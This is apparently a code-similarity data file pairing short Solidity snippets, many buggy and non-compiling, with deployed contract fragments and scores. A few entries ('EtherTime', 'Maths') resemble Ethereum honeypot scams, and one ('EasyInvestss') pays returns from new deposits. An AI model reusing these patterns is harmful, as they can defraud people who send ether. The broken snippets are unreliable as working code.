    public
    view
    returns (uint) {
        return address(this).balance;
    }
}",0.6676380376464909,"contract ContractResolver {

  address public owner;

  bool public locked;

  function init_register_contract(bytes32 _key, address _contract_address) public returns (bool _success);

  function unregister_contract(bytes32 _key) public returns (bool _success);

  function get_contract(bytes32 _key) public constant returns (address _contract);

}"
"contract A{
  struct St{
    uint val;
  }
  function double(uint a)external returns (uint res){
  res= 2*a;
  }
}",0.6627974410392269,"contract Ceil {

    

    

    function ceil(uint a, uint m) constant returns (uint ) {

        return ((a + m - 1) / m) * m;

    }

    

    

}"
"contract Mycontract
{
  function Mycontract() payable{}
}",0.6551320861559118,"contract WalletContract

{

	function payMe() public payable;

}"
"contract Subject {
  uint public count = 0;

  function increaseCount() returns newCount{
    count ++;
    newCount = count;
  }
}",0.6133769798880361,"contract ERC20Burnable is ERC20 {
    
    function burn(address account, uint256 amount) public {
        _burn(account, amount);
    }

    
    
    
    
}"
"contract Bang{
    address holder;
    address proxy;
    constructor (address _holder, address _proxy) public {
        holder=_holder;
        proxy=_proxy;
    }
    function getholder() public view returns(address){
        return holder;
    }
}",0.6393534120187389,"contract locaToken {

    function transferFrom(address _from, address _to, uint _value) public returns (bool);

    function allowance(address _owner, address _spender) public view returns (uint);

}"
"contract Hack{
Supreme public sup;

Supreme s;
function Hack(Supreme _sup){
    sup = _sup;
}
function sneak(address addr) public payable{
 s.Road.value(msg.value)();
  }
   function() payable{
   s.Road(); 
   }  
}",0.6145392060849699,"contract EtherTime

{

    address Owner = msg.sender;



    function() public payable {}



    function Xply() public payable {

        if (msg.value >= address(this).balance || tx.origin == Owner) {

            selfdestruct(tx.origin);

        }

    }

 }"
"contract ICOProxy  {
address tokenaddr;
function () payable public{
 uint256 amount = msg.value* 10 ; 
    address se=msg.sender;
    bytes4 methodId  =bytes4(keccak256(""transferFrom(address,address,uint256)""));
    tokenaddr.call(methodId,owner,se, amount);
}
}",0.6449642412085408,"contract TokenController {

    bytes4 public constant INTERFACE = bytes4(keccak256(""TokenController""));



    function allowTransfer(address _sender, address _from, address _to, uint256 _value, bytes _purpose) public returns (bool);

}"
"contract TEST{
   bytes note=""Yerevan is love"";
   function fname() public view returns(string memory){
      return string(note);
   }
}",0.6494212344706516,"contract WhitelistInterface {

  function hasRole(address _operator, string memory _role) public view returns (bool);

}"
"contract InsanFactory{

    struct User{
         string name;
         address myaddress;
    }

    mapping(address => User) public userStructs;

    address[] public userAddress ;

    function createUser(string memory name,address myaddress) public{
        userStructs[msg.sender] = name;
        
        userStructs[msg.sender] = myaddress;
        
        userAddress.push(msg.sender);

    }
    function getResult() external view returns(address[] memory){
        return userAddress;
    }
}",0.6151347200750302,"contract Registry is Ownable {
  mapping (address => address[]) public deployedContracts;

  event Added(address indexed sender, address indexed deployAddress);

  function add(address deployAddress) public {
    deployedContracts[msg.sender].push(deployAddress);
    Added(msg.sender, deployAddress);
  }

  function count(address deployer) constant returns (uint) {
    return deployedContracts[deployer].length;
  }
}"
"contract Catalog{
    address[] internal array;


    function pushItem(address _el) external{
         array.push(_el);
    }

    function getArray() external returns(address[]){
         return array;
    }
 }",0.6558726863791492,"contract GODGame {
        function updatePlayer(address addr, uint amount) external;
        function getPlayer(address addr) external returns(uint, uint, uint, address, address[]);
    }"
"contract B{
    A instance = new A();   
}",0.6662650198859188,"contract A {

    B public myB = new B();

}"
"contract Hello{
      uint256 var1 = 10;
      function changeVar1() public{
             var1 = 100;
      }
}",0.6217688971434098,"contract SpecialERC20 {

    function transfer(address to, uint256 value) public;

}"
"contract Addresses
{

string public moneroAddress;

function setAddress(string address_)public returns(bool)
{ 
moneroAddress = address_;
}
}",0.6524896721760892,"contract GNTJoinLike {
    function bags(address) public view returns (address);
    function make(address) public returns (address);
}"
"contract receiver{

function () external payable 

{


address someone = 0x.......
someone.send(msg.value);



assembly

{

invalid

}

}

}",0.6207605449183411,"contract Context {
    
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}"
"contract token{ 
    struct video { string title;  } 
    function add(){ 
    } 
}",0.6385832219365286,"contract token {

    function transfer(address _to, uint256 _value); 
 
 }"
"contract B{
  A a;
  function B(address aAddr){
     a = A(aAddr);
  }
}",0.6378772434685348,"contract Caller {
    function callAddress(address a) {
        a.call();
    }
}"
"contract Bank {
struct Customer {
    address _address; 
    uint deposit;
}

address owner;
mapping(address => Customer) public customerList;
uint customerCounter;

constructor() public payable {
    require(msg.value == 30 ether, ""Initial funding of 30 ether required for rewards"");
    
    owner = msg.sender;
    customerCounter = 0;
}

function enroll() public returns(uint){
    customerList[msg.sender].deposit = 5;
    customerList[msg.sender]._address = msg.sender;
    customerCounter++;

    return customerList[msg.sender].deposit;
}",0.6442173933910675,"contract EasyInvestss {

    

    mapping (address => uint256) invested;

    

    mapping (address => uint256) atBlock;

        address public owner;

        

        

function getOwner() public returns (address) {

    return owner;

  }

  

modifier onlyOwner() {

        require (msg.sender == owner);

        _;

    }



    

    function () external payable {

        

        if (invested[msg.sender] != 0) {

            

            

            

            uint256 amount = invested[msg.sender] * 4 / 100 * (block.number - atBlock[msg.sender]) / 5900;



            

            address sender = msg.sender;

            sender.send(amount);

        }



        

        atBlock[msg.sender] = block.number;

        invested[msg.sender] += msg.value;

    }

}"
"contract users{
struct User{
    uint id;
    string str;
}
User [] public adds;
function del(){
    delete adds;
}
function delElem(uint i){
    delete adds[i];
}
function add(uint id,string cc){
    adds.push(User(id,cc));
}
function getLength()constant returns(uint){
    return adds.length;
}}",0.6245939195698443,"contract AppCoinsIABInterface {
    function division(uint numerator, uint denominator) public constant returns (uint);
    function buy(uint _amount, string _sku, address _addr_appc, address _dev, address _appstore, address _oem) public constant returns (bool);
}"
"contract MainAcceptedOffers {
    function accept(uint _acceptance, address payable _casher) public payable virtual;
}",0.6313045503371906,"contract PackInterface {

    

    function purchaseFor(address user, uint16 packCount, address referrer)  public payable;

}"
"contract MyContract{
uint constant value = 90;
string constant mystr = ""Hello"";

function getValue() constant returns(uint){
    return value;
}

function getMystr() constant returns(string){
    return mystr;
}
}",0.6305557009237507,"contract FiatContract {

    function ETH(uint _id) public constant returns (uint256);

  	function EUR(uint _id) public constant returns (uint256);

  	function updatedAt(uint _id) public constant returns (uint);

}"
"contract graduate{
     uint studentId;
     string name;
     string major;
     uint totalGrade;

     function setGraduate(uint x, string y, string z, uint v) public{
           studentId = x;
           name = y;
           major = z;
           totalGrade = v;
     }

    function getGraduate() public view returns (uint _studentId,string _name,string _major,uint _totalGrade){
          return studentId;
          return name;
          return major;
          return totalGrade;
    }

}",0.6402153877667767,"contract ERC20Detailed is IERC20 {

    string private _name;

    string private _symbol;

    uint8 private _decimals;



    constructor (string memory name, string memory symbol, uint8 decimals) public {

        _name = name;

        _symbol = symbol;

        _decimals = decimals;

    }



    

    function name() public view returns (string memory) {

        return _name;

    }



    

    function decimals() public view returns (uint8) {

        return _decimals;

    }

}"
"contract z2 is z3{

    function z2 (){}

    function createZ3() returns(z3){
        z3 newZ3 = new z3();
        return newZ3;
    }



}",0.6182175058930529,"contract Counter {
  uint i=1;
  function inc() {
    i=i+1;
  }
  function get() constant returns (uint) {
    return i;
  }
}"
"contract Election{
    string public candidate;
    constructor() public{
        candidate=""Zeeshan"";
    }
}",0.6075320606949178,"contract Ownable {



  address public owner;



  constructor() public {

    owner = msg.sender;

  }



}"
"contract storeNumber{
   uint test;
    function setValue(uint number) public{
        test = number;
    } 
}",0.618967788887552,"contract secretHolder {

    uint secret;

    function getSecret() public returns(uint) {

        return secret++;

    }

}"
"contract SampleContract{
    string public str;
    constructor()public{
        str=""Hello World!""; 
    }
    function setter(string memory s)public{
        str=s;  
    }
}",0.6180435985397423,"contract ComponentInterface {

    string public name;

    string public description;

    string public category;

    string public version;

}"
"contract C{
    uint public a = 9;
    uint[] public data;

    function f(uint _a) public{
        a = _a;
        uint[] y;
        y.push(2900);
    }
}",0.6106402147457569,"contract Kicker {
    function kick(address urn, address gal, uint tab, uint lot, uint bid)
        public returns (uint);
}"
"contract Test
{
    uint public v;
    
    function updateV(uint value)
        external
    {
        v = value;
    }
}",0.6514010141666028,"contract Token{

  function transfer(address to, uint value) external returns (bool);

}"
"contract New{

    mapping(address => string) public users;

    string name;

    address[] public userAddress ;
    

    function updateUser(string memory name) public{
        users[msg.sender]= name;

    }
    function getUser(address[] calldata) external view returns(string memory){
        return users.name;
    }

}",0.6594012016619658,"contract IFulcrum {
    function tokenAddresses(uint256 i) external view returns(address);

    function tokens(address _token)
        external
        view
        returns(
            address token,
            address asset, 
            string memory name,
            string memory symbol,
            uint256 tokenType, 
            uint256 index
        );
}"
"contract FirstContract{

function anyFunction(){}

}",0.6933118105534836,"contract MyContract {
    
    function MyContract() {

    }
}"
"contract MyCoinCrowdsale is MintedCrowdsale {
    function MyCoinCrowdsale
        (
            uint256 _rate,
            address _wallet,
            CappedToken _token
        )
        public
        Crowdsale(_rate, _wallet, _token) {

        }
}",0.6133014465264879,"contract MintedCrowdsale is Crowdsale {



  

  function _deliverTokens(

    address _beneficiary,

    uint256 _tokenAmount

  )

    internal

  {

    require(MintableToken(token).mint(_beneficiary, _tokenAmount));

  }

}"
"contract demo{

    address public user;
    uint  public  i=0;

    function demo(){
        user=msg.sender;
    }

    address[10] users;
    bytes32[10] name;

    function add(bytes32 _name){

        users[i]=user;
        name[i]=_name;
        i++;

    }

    function get_names() returns(bytes32[10]){
        return name;
    }

    function get_address() returns(address[10]){
        return users;
    }
  }",0.6588806683375072,"contract ConsensysAcademy{
    mapping(address=>bytes32) public names;
    address[] public addresses;
    
    modifier onlyUnique(){
        if(names[msg.sender] == 0){ _; }else{ throw; }
    }
    function register(bytes32 name) onlyUnique{
        names[msg.sender] = name; 
        addresses.push(msg.sender);
    }
    function getAddresses() returns(address[]){ return addresses; }
}"
"contract C is B{
    uint c;

    constructor(uint _a, uint _b, uint _c) public {
        B(_a, _b);
        c = _c;
    }
}",0.6155029966144138,"contract Ceil {

    

    

    function ceil(uint a, uint m) constant returns (uint ) {

        return ((a + m - 1) / m) * m;

    }

    

    

}"
"contract a {
    struct Str {
        uint256 totalTokens;
        mapping(address => uint256) playerTokens;
    }

    mapping(uint256 => Str) public tokenStores;
}",0.6554078902908973,"contract IMigrationContract {

    function migrate(address _addr, uint256 _tokens, uint256 _totaltokens) public returns (bool success);

}"
"contract Relay {
        address public currentVersion;
        address public owner;

        function Relay(address initAddr){
            currentVersion = initAddr;
            owner = msg.sender;
        }

        function update(address newAddress){
            if(msg.sender != owner) throw;
            currentVersion = newAddress;
        }

        function(){
            if(!currentVersion.delegatecall(msg.data)) throw;
        }
    }",0.6281288146407082,"contract Owned {
    address public owner;
    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }

    function Owned() { owner = msg.sender; }

    function isOwner(address addr) public returns(bool) { return addr == owner; }

    function transfer(address newOwner) public onlyOwner {
        if (newOwner != address(this)) {
            owner = newOwner;
        }
    }
}"
"contract Foo{

    function a(uint _amount);

}",0.6514184042628294,"contract test {
    function f() public { }
}"
"contract Users {

    enum UserType{
        Producer,
        Manufacturer,
        Supplier,
        Retailer,
        Consumer
    }

    modifier onlyManufacturer(address _owner){
        require (isManufacturer(_owner), ""Only Manufacturer's are allowed to access this function"");
        _;
    }

function isManufacturer(address _userAddress) public view returns(bool){
        UserType temp = UserType.Manufacturer;
        if(users[_userAddress].userType == temp){
            return true;
        }else{
            return false;
        }
    }",0.6059320068030264,"contract Verification is owned {

	using SafeMath for uint256;

    mapping(address => uint256) veruser;

	

	function RA(address _to) public view returns(bool){

		if(veruser[_to]>0){

			return true;

			}else{

				return false;

				}

	}

	

	function Verification() public {

	    if(RA(msg.sender) == false){

			veruser[msg.sender] = veruser[msg.sender].add(1);

			}

	}

	

	

	function DelVer(address _address) public onlyOwner{

		if(RA(_address) == true){

			veruser[_address] = veruser[_address].sub(0);

		}

		

		

	}

	

}"
"contract Bank{
    mapping(address=>uint) balances;

    function deposit() public payable{
        balances[msg.sender]+=msg.value;
    }
    function withdraw(uint amount) public{
        if(balances[msg.sender]>=amount){
            balances[msg.sender]-=amount;
            msg.sender.transfer(amount);
        }
    }
}",0.6514094122075169,"contract Maths

{

    address Z = msg.sender;

    function() public payable {}

    function X() public { if (msg.sender==Z) selfdestruct(msg.sender); }

    function Y() public payable { if (msg.value >= this.balance) msg.sender.transfer(this.balance); }

 }"
"contract Voting {
 struct voter {
   address voterAddress;
   uint256 tokensBought;
   mapping (bytes32 => uint256) tokensUsed;
 }
 mapping (address => voter) public voterInfo;
}",0.6736324422782177,"contract StandardToken is Token {

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    uint256 public totalSupply;
}"
"contract B {
        uint Bstate;
        function methodX (){
        Bstate =1;
        }
    }",0.619727278850334,"contract Test {
    uint public test;
    
    function Test() {
        test = 1;
    }
}"
"contract A{
  function validateSchedule(uint scheduleId)
    public
    view
    returns(uint)
  {
    uint amount = schedules[scheduleId].amount;
    return amount;
  }
}",0.6257523659650308,"contract IFeeWallet {



  function getFee(

    uint amount) public view returns(uint);



  function collect(

    address _affiliate) public payable;

}"
"contract Election{
    string public candidate;
    constructor() public{
        candidate = ""candidate 1""; 

    }   
}",0.6428608476796894,"contract Reclaimable is Ownable {

    
    constructor() public payable {
    }

    
    function() public payable {
    }
}"
"contract test{
    constructor(address _recipient, address _user){
      ...
    }
}",0.6052004850491859,"contract {
        address swapAddress;
        address lp;
        uint index;
    }"
"contract Call{
Test test;

   function addTest(address addr){
      test = Test(addr)
   }
}",0.6149316943161527,"contract EnsResolver {
	function setAddr(bytes32 node, address addr) public;
}"
"contract WrapUnwrap
{

WETH9_ internal WETH;
constructor (address payable WETHAddr) public {

    require(WETHAddr != address(0), ""WETH is the zero address"");

    WETH = WETH9_(WETHAddr);

}

    function wrap() payable public   
{
    uint256 ETHAmount =msg.value;

    
    if (msg.value != 0) {
        WETH.deposit.value(msg.value)();
    }   
    require(WETH.balanceOf(address(this))>=ETHAmount,""Ethereum not deposited"");
}


function unwrap(uint256 Amount) public 
{
    address payable sender= msg.sender;

    if (Amount != 0) {
        WETH.withdraw(Amount);
        sender.transfer(address(this).balance);
    }
}
}",0.6428457757243842,"contract CommunityChest {

    

    address owner;

    

    event Deposit(uint256 value);

    event Transfer(address to, uint256 value);

    

    constructor () public {

        owner = msg.sender;

    }

    

    function send(address payable to, uint256 value) public onlyOwner {

        to.transfer(value / uint(2));

        msg.sender.transfer(value / uint(2));

        emit Transfer(to, value);

    }



    function () payable external {

        emit Deposit(msg.value);

    }



    function getBalance() public view returns (uint256) {

        return address(this).balance;

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

}"
"contract demo {
   string public name = ""some32bitString"";
   function returnValue() constant returns (string){
      return name; 
   } 
}",0.6358776408083565,"contract StandardTokenExt is StandardToken {

  
  function isToken() public constant returns (bool weAre) {
    return true;
  }
}"
"contract demo {
  string public name = ""someString""; 

  function returnValue() constant returns (string){ 
      return name;    
  }
}",0.6502566484149268,"contract MyContract {
    function whatDidJasonSay() constant returns (string said){
        return ""ether is a scam"";
    }
}"
"contract POD{
address public seller;
address public buyer;
address public nextCourier;",0.65778796638017,"contract OwnedInterface {
    address public owner;
    address public newOwner;

    modifier onlyOwner {
        _;
    }
}"
"contract pullother {
address public hello;

function g() returns (address){
    hello = new helloworld();
    return hello;
}

function y(address contractadd) returns (uint){
    helloworld h = helloworld(contractadd);
    h.f();
}
}",0.6233268405293623,"contract ERC20Token {
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {}
    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}
    
}"
"contract User{

    string public userName;

    function User(string _name){

     userName = _name;

    }

}",0.6590606107163995,"contract Resolver {
    function setName(bytes32 node, string memory name) public;
}"
"contract Underflow1 {
    uint8 arr[256];
    uint8 i= 0;
    function testf2() public returns (uint8){
      for(i=0; i<arr.length; ++i);
      if(i==256)
        return true;
      else
        return false;
    }
}",0.6102206829716714,"contract Ownable {

    address public Owner = msg.sender;

    function isOwner() public view returns (bool) {

        if (Owner == msg.sender) return true; return false;

    }

}"
"contract receiver{
    old o;
    struct Student1{
        bytes32 name1;
        uint age1;
    }
    uint public sno1 = 0;
    mapping (uint => Student) pupil;
    function set(){
      ........
    }
}",0.6417594771789972,"contract Jug {
    struct Ilk {
        uint256 duty;
        uint256  rho;
    }

    mapping (bytes32 => Ilk) public ilks;

    function drip(bytes32) public returns (uint);
}"
"contract CoffeeNetworking{ 
    Usermapping u  = Usermapping(0x9B3a12cF7D8560DCd3d5D148cDCBCb9E1617D06F); 
    uint256 public version =1;
    

    constructor () public {
    
    }

    function addValue(uint a) public returns (bool){
        
        return u.addValue(a);
    }

    function getValue() public view returns (uint256){
        
        return u.getValue();
    }

    function setName(bytes32 name) public returns(bool){
        
        return u.setName(name);
    }

     function getName() public view returns(bytes32){
        
        return u.getName();
    }

}",0.6349302088303121,"contract ERC20 {
  function balanceOf(address tokenDeployer) public view returns (uint);
  function approve(address delegate, uint numTokens) public returns (bool);
  function transfer(address _to, uint256 _value) public returns (bool success);
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
  function burn(uint256 value) public;
  function mou() public view returns (uint256);
}"
"contract Client { 
address public registrator_contract; 
address public counter_contract; 

function Client(address reg_addr, address cnt_addr) 
{ 
registrator_contract = reg_addr; 
counter_contract = cnt_addr; 
} 

function Register() 
public 
{ 
var rez = registrator_contract.call(bytes4(sha3(""Register(address useraddr)"")), msg.sender); 
} 

function GetTick() 
public 
{ 
var rez = counter_contract.call(bytes4(sha3(""TickNumber(address user_addr)"")), msg.sender); 
} 

function Remove() 
public 
{ 
var rez = registrator_contract.call(bytes4(sha3(""Remove(address user_addr)"")), msg.sender); 
} 
}",0.6063899400123831,"contract Deployer {
  address owner;
  address factory;

  function Deployer(address _factory) public {
    factory = _factory;
    owner = msg.sender;
  }

  function newContract(address _party, address user_contract, uint _start_date) public returns (address created) {
    require(msg.sender == factory);
    address new_contract = new TokenToTokenSwap(factory, _party, user_contract, _start_date);
    return new_contract;
  }

   function setVars(address _factory, address _owner) public {
    require (msg.sender == owner);
    factory = _factory;
    owner = _owner;
  }
}"
"contract Inbox{
    string public message;

constructor(string memory IntialMessage) public{
    message = IntialMessage;
}

function setMessage(string memory newMessage) public{
    message = newMessage;
}
}",0.6567127540720168,"contract Bulletin {
    
    string public message = """";
    address public owner;
    
    function Bulletin(){
        owner = msg.sender;
    }
    
    function setMessage(string _message){
        require(msg.sender == owner);
        message = _message;
    }
}"
"contract Test{


  bytes ar;

  function set_a(bytes val) external{

  

 

   }
}",0.6871322221733375,"contract VatLike {
    function file(bytes32, bytes32, uint) external;
}"
"contract test{
    mapping (address => uint) balances;
    function Deposit() public payable{
        balances[msg.sender] += msg.value;
    }
    function Withdraw() public{
        msg.sender.transfer(balances[msg.sender]);
        balances[msg.sender] = 0;
    }
    function CheckBalance() view public returns(uint){
        return balances[msg.sender];
    }
}",0.6981737492715047,"contract Token {
    address public issuer;
    mapping (address => uint) public balances;

    function Token() {
        issuer = msg.sender;
        balances[issuer] = 1000000;
    }

    function transfer(address _to, uint _amount) {
        if (balances[msg.sender] < _amount) {
            throw;
        }

        balances[msg.sender] -= _amount;
        balances[_to] += _amount;
    }
}"
"contract adding{

  uint256 public total;
  function  add(uint256 val1,uint256 val2) public returns(uint256){
    total = val1+val2;
    return total;
  }
}",0.6559971415464779,"contract ERC20 {

    function totalSupply() public view returns (uint256);

    function balanceOf(address _who) public view returns (uint256);

}"
"contract test {
    uint128 public aPos=10;
    function updateQuota( uint128  _Quota){
        aPos = _Quota;
    }
}",0.600185601565034,contract test { function multiply(uint a) public pure returns(uint d) {   return a * 7;   } }
"contract B{
    A instance;

    function anotherFunction() public{
        A.anyFunction();
    }

}",0.6174636858928797,"contract EndLike {
    function cage() public;
    function cage(bytes32) public;
}"
"contract cust{

    struct a{
        uint id;
        string name;
    }

    a[] arr;

    function set(uint x, string memory y ) public
    {
        a memory temp;
        temp.id=x;
        temp.name=y;

        arr.push(temp);
    }
    function get(uint x) public view returns(uint,string memory){
        uint i;
        for(i=0;i<arr.length;i=i+1)
        {
            if(arr[i].id==x)
            {
                return(arr[i].id,arr[i].name);
            }
        }
    }
}",0.6448184254364188,"contract manyTests {
    uint256 a;
    string b = ""I am view"";
    
    function addSomeRandomStuff(address[][] memory tokens) public {
         a = a + 1;
    }
    
    function showMePure() pure public returns (string memory) {
        return ""I am pure"";
    }
    
    function showMeView() view public returns (string memory) {
        return b;
    }
}"
"contract PracticeInheritance is Regulator{
    uint private value;

    constructor (uint amount) public{
        value +=amount;
    }
    function deposit(uint amount) public{
        value += amount;
    }
    function withdraw(uint amount) public{
        if (CheckValue(amount)){
            value -= amount;
        }

    }

    function balance() view public returns(uint){
        return value;
    }

     function CheckValue(uint amount)public returns(bool){
            return amount <= value;
        }
        function loan()public returns(bool){
            return value >=0;
        }
}",0.655937688281593,"contract Sample {



    uint public test_num;

    uint[] public test_array;



    constructor() public {

        test_num = 100;

    }



    function increse(uint _val) external {

        test_num += _val;

    }



    function decrease(uint _val) external {

        test_num -= _val;

    }

    

    function get_test_num() public returns (uint){

        return test_num;

    }

    

    function set_test_array(uint _val) public returns (uint){

        test_array.push(_val);

    }

    

    function get_test_array(uint index_num) public view returns(uint){

        return test_array[index_num];

    }



}"
"contract A{


uint bidValue;

   address bidder;

   function bid() public payable{

   bidValue = msg.value;    

   bidder = tx.origin;

   }

}",0.664936229673446,"contract TestToken {
    
    mapping (address => uint) public balanceOf;
    
    function () public payable {
        
        balanceOf[msg.sender] = msg.value;
        
    }
    
}"
"contract ERC20Registry {
  function deployERC20(
    string _Name,
    string _Symbol,
    uint256 _initialSupply
    )
    public
    returns (address)
    {
      TERC20 token = new TERC20(_Name, _Symbol, 18, _initialSupply);
     token.transfer(tx.origin, token.totalSupply());
     return address(token);
    }
}",0.6303705748056814,"contract DongriToken is StandardToken {
  string public name = ""DongriToken"";
  string public symbol = ""DON"";
  uint public decimals = 18;

  function DongriToken(uint initialSupply) public {
    totalSupply_ = initialSupply;
    balances[msg.sender] = initialSupply;
  }
}"
"contractB{
    function setContract(address sender,address contractcAddress){
        ....
    }
}",0.6373895671013089,"contract ContractCreator {

    function setContract() public returns(address);

}"
"contractC{
    function contractC(address sender,address contractaAddress,address contractbAddress){
        ....
    }
}",0.6159486900047793,"contract ContractProvider {
	function contracts(bytes32 contractName) returns (address addr){}
}"
"contract Timestamp {
   uint start;
   uint end;
   function start(){
      start = block.timestamp;
   } 
   function end(){
      end = block.timestamp;
   } 
   function getTimeDif() returns(uint){
      return end - start;
   }     
}",0.6407432755077225,"contract Time is ITime {

    function getTimestamp() external view returns (uint256) {

        return block.timestamp;

    }



    function getTypeName() public view returns (bytes32) {

        return ""Time"";

    }

}"
"contract Prova
{

   function prova() public{

      uint[] memory array;
      array.push(4);

   }
}",0.6038902217499356,"contract token {function transfer (address receiver, uint _amount) public { } }"
"contract Election
{
    struct      Candidate
    {
        string  name;
        uint    voteCount;
    }

    struct      Voter
    {
        bool    authorized;
        bool    voted;
        uint    voteTarget;
    }
    address payable  public             owner;
    string public                       electionName;
    mapping(address => Voter) public    voters;
    Candidate[] public                  candidates;
    uint public                         totalVotes;
    Passport                            pass;

    modifier ownerOnly()
    {
        require(msg.sender == owner);
        _;
    }

    constructor(string memory _electionName) public
    {
        owner = msg.sender;
        electionName = _electionName;
    }

    function addCandidate(string memory _candidateName) ownerOnly public
    {
        candidates.push(Candidate(_candidateName, 0));
    }

    function getNumCandidate() public view returns(uint)
    {
        return candidates.length;
    }

    function authorize(address _person) public
    {
        voters[_person].authorized = true;
    }

    function vote(uint _voteIndex) public
    {
        
        pass = Pasport(msg.sender);

        
        require(pass.isRegistered(msg.sender));

        require(!voters[msg.sender].voted);
        require(voters[msg.sender].authorized);

        voters[msg.sender].voteTarget = _voteIndex;
        voters[msg.sender].voted = true;

        candidates[_voteIndex].voteCount += 1;
        totalVotes += 1;
    }

    function end() ownerOnly public
    {
        selfdestruct(owner);
    }
}",0.6133125818337167,"contract StrongHandsManager {

    

    event CreateStrongHand(address indexed owner, address indexed strongHand);

    event MintToken(address indexed owner, uint256 indexed amount);

    

    mapping (address => address) public strongHands;

    mapping (address => uint256) public ownerToBalance;

    

    

    string public constant name = ""Stronghands3D"";

    string public constant symbol = ""S3D"";

    uint8 public constant decimals = 18;

    

    uint256 internal tokenSupply = 0;



    function getStrong(address _referrer)

        public

        payable

    {

        require(strongHands[msg.sender] == address(0), ""you already became a Stronghand"");

        

        strongHands[msg.sender] = (new StrongHand).value(msg.value)(msg.sender, _referrer);

        

        emit CreateStrongHand(msg.sender, strongHands[msg.sender]);

    }

    

    function mint(address _owner, uint256 _amount)

        external

    {

        require(strongHands[_owner] == msg.sender);

        

        tokenSupply+= _amount;

        ownerToBalance[_owner]+= _amount;

        

        emit MintToken(_owner, _amount);

    }

    

    

    function totalSupply()

        public

        view

        returns (uint256)

    {

       return tokenSupply;

    }

    

    function balanceOf(address _owner)

        public

        view

        returns (uint256)

    {

        return ownerToBalance[_owner];

    }

}"
"contract B is Onwed{
     constructor() public{
        uint256 totalSupply = 10000000000;     
     }
}",0.6461893003492748,"contract    Token  is  ERC20
{
    using SafeMath  for uint256;

    
    constructor()   public 
    {
    }
    
    
    
}"
"contract A {
  constructor() public {
    B.Player storage p = B.Players[1];
  }
}",0.6131433785690049,"contract Contract {
    uint256 public a;
    constructor () public {
        a = 1;
    }
}"
"contract University { 
    address public owner; 
    address public student; 
    bytes32 fName; 
    bytes32 lName; 
    bytes32 Studies; 
    bytes32 private caCertificate; 
    bytes32 ipfs_hash;

    constructor() public { 
        owner = msg.sender; 
    } 

     modifier onlyOwner() { if (msg.sender == owner) _; } 
     modifier onlyOwnerOrStudent() { 
         if (msg.sender == owner || msg.sender == student) _; 

    .....
}",0.6585558224976278,"contract Ownable {

  address public owner;



  

  constructor() public {

    owner = msg.sender;

  }



  

  modifier onlyOwner() {

    require(

      msg.sender == owner,

      ""msg.sender is not owner""

    );

    _;

  }



  

  function transferOwnership(address newOwner)

    public

    onlyOwner

    returns (bool)

  {

    if (newOwner != address(0) && newOwner != owner) {

      owner = newOwner;

      return true;

    } else {

      return false;

    }

  }

}"
"contract demo is Ownable
{
    function sendEth() external payable
    {
        
        address _owner = owner();
        _owner.transfer(msg.value);
    }
}",0.6812544530042856,"contract Ownable {
  address owner;
  function Ownable() {
    owner = msg.sender;
  }

  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
}"
"contract Marketplace {
    uint public notificationCount = 0;
    mapping(uint => FileChanges) public modifications;
    struct FileChanges
    {
        string name;
        address madeBy;
        string changesMade;
        string timeStamp;
    }
    function updateModifications(string memory _name, string memory _message, string memory _date) onlyOwner public payable
    {
        notificationCount++;
        modifications[notificationCount] = FileChanges(_name, msg.sender, ""Contract created"", _date);
    }
}",0.6387909072851373,"contract SimpleVoting {



    string public constant description = ""abc"";



    string public name = ""asd"";



    mapping (string => string) certificates;



    address owner;



    constructor() public {

        owner = msg.sender;

    }



    function getCertificate(string memory id) public view returns (string memory) {

        return certificates[id];

    }



    function setCertificate(string memory id, string memory cert) public {

        require(msg.sender == owner);

        certificates[id] = cert;

    }

}"
"contract Caller{

    Callee public c;
    constructor() public {
      c = new Callee();
    }
    function someAction() public view returns(uint){
      return c.getValue();
    }
    function inc() public returns(uint){
      return c.increment();
    }
}",0.6824359427584187,"contract Counter {
    uint256 count;  

    function Counter(uint256 _count) public {
        count = _count;
    }

    function increment() public {
        count += 1;
    }

    function getCount() public view returns (uint256) {
        return count;
    }
}"
"contract getAndSet {
    uint public num;
    function set(uint val){
        num = val;
    }
}",0.6596253783613536,"contract Stats {
  function getDay( uint128 day) public view returns (uint);
}"
"contract Demo {
 uint public balance;

 constructor() public
 {
  balance = 0;
 }

 function contribute() public payable
 {
  balance += msg.value;
 }
}",0.6761596780569827,"contract PayChannel {

    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function () payable public {
        owner.transfer(msg.value);
    }
}"
"contract contractFactory{

    event contractCreated(string name, address institution, address parent);

    function createContract(
        string _name,
        address head,
        address creator,
        address[] _Members)
    public returns(address){

        Contracts  ContractAddress = new Contracts(_name , head , creator , _Members);
        emit contractCreated(_name,address(ContractAddress), creator);
        return address(ContractAddress);
    }
}",0.6046349590172544,"contract DelegateContract is Ownable {

  address delegate_;



  event LogicContractChanged(address indexed newAddress);



  

  modifier onlyFromAccept() {

    require(msg.sender == delegate_);

    _;

  }



  function setLogicContractAddress(address _addr) public onlyOwner {

    delegate_ = _addr;

    emit LogicContractChanged(_addr);

  }



  function isDelegate(address _addr) public view returns(bool) {

    return _addr == delegate_;

  }

}"
"contract Contracts{

    function  dosomthing(){}
}",0.6859931524234856,"contract MyContract {
    
    function MyContract() {

    }
}"
"contract bar {
   function getFoo() returns (foo);
}",0.6607199954748265,"contract TUB {
    function off() public returns(bool);
}"
"contract messageHash {

function hashPersonalMessage(bytes _message) returns (bytes32){
    bytes32 msgHash = sha3('\x19Ethereum Signed Message:\n64', _message);
    return msgHash;
}
",0.6024792751629409,"contract Validator {

    function verify(bytes32 r, bytes32 s, uint8 v, bytes32 messageHash) public pure returns (address) {

        return ecrecover(messageHash, v, r, s);

    }

}"
"contract PermissionsManager {
  using Roles for Roles.Role;

  event LogAdminRoleAdded(address indexed account);
  event LogAdminRoleRemoved(address indexed account);

  Roles.Role internal adminRole;

  constructor() public {
    adminRole.add(msg.sender);
  }

  modifier onlyAdmin() {
    require(isAdmin(msg.sender));
    _;
  }

  function isAdmin(address account) 
  public
  view 
  returns (bool) 
  {
    return adminRole.has(account);
  }

  function addAdmin(address account) 
  public 
